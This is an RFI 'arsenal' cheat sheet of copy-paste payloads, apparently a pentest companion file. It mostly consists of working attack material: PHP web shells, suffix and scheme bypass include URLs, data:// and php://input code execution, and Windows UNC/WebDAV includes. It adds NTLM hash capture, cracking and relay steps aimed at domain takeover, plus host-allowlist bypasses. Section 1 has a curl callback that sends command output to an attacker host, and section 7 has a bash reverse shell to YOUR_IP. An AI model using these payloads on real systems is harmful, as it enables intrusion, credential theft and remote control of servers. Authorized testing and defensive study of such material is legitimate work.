# RFI Arsenal — Remote-Include Payloads, Suffix-Defeats & Shell-Host Snippets (copy-paste)

> Companion to `RFI_TESTING_GUIDE.md`. Authorized testing only — **benign markers**, clean up (Guide §19).
> RFI = your code **executes** on the target (RCE). A mere fetch is **SSRF** — prove execution (Guide §4/§15).

---

## 1. Benign proof payloads to HOST (serve as text/plain)

```php
# shell.txt  — execution proof (prints RFI-EXEC-343 only if PHP RAN)
<?php echo "RFI-EXEC-".(7*7*7); ?>

# cmd.txt  — command execution
<?php system($_GET['c']); ?>

# blind proof (callback carries command output → proves EXECUTION not just fetch)
<?php system('curl -s http://YOUR_OOB/exec_$(id|tr " " "_")'); ?>

# time-based blind proof
<?php sleep(10); ?>
```
Host with: `python3 poc/payload_host.py --port 8000` (sets `Content-Type: text/plain` + logs hits).

## 2. Core remote-include payloads (Guide §5/§6)

```
?page=http://YOUR_IP:8000/shell.txt                 # plain (no forced suffix)
?page=http://YOUR_IP:8000/shell.txt?                # ? swallows an appended ".php"   ★ most reliable
?page=http://YOUR_IP:8000/shell.txt%23              # # (fragment) swallows ".php"
?page=http://YOUR_IP:8000/shell.txt%00              # null byte (PHP < 5.3.4)
?page=http://YOUR_IP/shell.txt%253f                 # double-encoded ?
?page=https://YOUR_IP/shell.txt?                    # https variant
?page=ftp://YOUR_IP/shell.txt?                       # ftp variant
?page=http://YOUR_IP:80/shell.txt?                   # use :80 if high ports are egress-blocked
# then add the command:  &c=id
```

## 3. Scheme / encoding bypasses (Guide §7)

```
hTtP://YOUR_IP/shell.txt?            # case
http:/\YOUR_IP/shell.txt?            # slash confusion
http://0xC0A80001/shell.txt?         # hex IP host (SSRF kit §6)
http://3232235521/shell.txt?         # decimal IP host
http://YOUR_IP%2fshell.txt           # encoded slash
smb://YOUR_IP/share/shell.php        # smb scheme (some configs)
```

## 4. data:// / php://input / expect (no remote URL — Guide §9)

```
# data:// (base64 = <?php system($_GET['c']);?>)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id

# php://input — PHP in the POST body
?page=php://input        (POST body:)  <?php system($_GET['c']); ?>     (?c=id)

# expect://
?page=expect://id
```
base64 helper:
```bash
echo -n '<?php system($_GET["c"]); ?>' | base64    # PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==
```

## 5. Windows UNC / SMB include (Guide §10)

```
# host the share (Kali/WSL):
impacket-smbserver share ./www -smb2support          # put shell.php (PHP) in ./www
# include over UNC (Windows PHP, no allow_url_include needed):
?page=\\YOUR_IP\share\shell.php                       # raw
?page=%5c%5cYOUR_IP%5cshare%5cshell.php               # url-encoded
?page=\\YOUR_IP\share\shell.php%00
```

## 5b. NTLM hash capture & relay — payoff even WITHOUT execution (Guide §10.1)
```
# the UNC fetch authenticates the target's machine/service account to YOUR server BEFORE the file runs:
sudo responder -I eth0                                 # captures NetNTLMv2 when the include opens \\YOUR_IP\x
?page=\\YOUR_IP\x                                      # → Responder logs the hash + the target's source IP
hashcat -m 5600 ntlm.txt rockyou.txt                   # crack the NetNTLMv2 offline
# RELAY (authorized red-team — no cracking):
ntlmrelayx.py -smb2support -t ldap://<DC>              # or -t smb://<host> / -t http://<host> → exec/DCSync/AD takeover
?page=\\YOUR_IP\x                                      # the coerced auth is relayed to the target service
```

## 5c. WebDAV over HTTP(S) — when SMB/445 egress is blocked (Guide §10.2)
```
# Windows redirector falls back to WebDAV; outbound 80/443 is almost always allowed:
?page=\\YOUR_IP@80\share\shell.php                     # UNC over WebDAV (HTTP/80)
?page=\\YOUR_IP@SSL@443\share\shell.php                # UNC over WebDAV (HTTPS/443)
?page=%5c%5cYOUR_IP@80%5cshare%5cshell.php             # url-encoded
# host a WebDAV server (wsgidav / Responder WebDAV) serving shell.php → executes (RFI→RCE) AND leaks the NetNTLM hash.
```

## 6. Allowlist / host-filter bypass (Guide §8)

```
?page=https://allowed.com/redirect?url=http://YOUR_IP/shell.txt?     # open redirect on allowed host (server follows)
?page=http://allowed.com.YOUR_DOMAIN/shell.txt?                       # "startsWith allowed" (you own *.YOUR_DOMAIN)
?page=http://YOUR_IP/allowed.com/shell.txt?                           # "contains allowed"
?page=http://allowed.com@YOUR_IP/shell.txt?                          # @-confusion (validator vs fetcher)
```

## 7. RCE → shell (authorized engagements only — Guide §11)

```
&c=id                                  # benign proof (use first)
&c=whoami
&c=hostname
&c=uname -a
# reverse shell (explicit authorization only; bug bounty: a single `id` is enough):
&c=bash -c 'bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261'     # (%26 = &)
```

## 8. Other stacks (Guide §14)

```
JSP:        ?page=http://YOUR_IP/shell.jsp        (host a JSP)
ColdFusion: ?template=http://YOUR_IP/shell.cfm
Node:       (dynamic require/import of user input) → remote/poisoned module → RCE
Python:     template-include from URL → usually SSTI → SSTI kit
```

## 8b. Real-world RFI surfaces, CVEs & chains (guide §3/§14) + references
```
□ Legacy PHP apps / abandoned plugins & themes with include($_GET[...]) and allow_url_include=On (WordPress plugins,
   osCommerce, Joomla extensions, old TimThumb-era code) — the classic mass-exploited RFI.
□ allow_url_include=Off (modern default) → RFI "still works" via data:// / php://input (§4) and, on Windows, UNC/SMB (§5).
□ ColdFusion <cfinclude template="#url.x#"> ; JSP <jsp:include page="<url>"/> / <c:import url=> → host .cfm/.jsp → RCE.
□ Node dynamic require(userInput) / import(userInput) ; Python __import__/importlib of user input → remote/poisoned module.
□ Windows UNC include + Responder/impacket-smbserver → RCE AND NTLM hash capture (relay to other hosts).
□ Open-redirect-on-allowed-host → smuggle your payload URL past a host allowlist (§6) → RFI.
□ RFI confused with SSRF: a fetch with NO execution is SSRF (SSRF kit), not RFI — prove execution (echo 7*7*7) (§1).
□ Chain: RFI → web shell → read config/.env → DB/cloud creds → cloud takeover (SSRF kit §11 discipline).
```
> **References:** PortSwigger *File inclusion*, PayloadsAllTheThings *File Inclusion* (RFI section), HackTricks *LFI/RFI*,
> OWASP WSTG (Remote File Inclusion), `kurobeats/fimap`, impacket-smbserver/Responder, Hackviser & PentesterLab
> file-inclusion modules. PHP `allow_url_include`/`allow_url_fopen` docs.

---

## 9. Triage rules (don't waste a report)

```
your CODE executed (computed marker / cmd output)    → REPORT RFI → RCE = Critical (benign marker + id; clean up)
data:// / php://input / UNC executed your PHP         → REPORT RFI → RCE = Critical
server only FETCHED your URL (no execution)           → it's SSRF → SSRF kit (NOT an RFI report)
raw <?php text shown in the page                      → non-exec include → maybe stored XSS/info, not RCE
http:// blocked and you stopped                       → test data:// / php://input / UNC before giving up
blind hit only, no execution proof                    → prove exec (callback-with-output/sleep) or it's SSRF
```
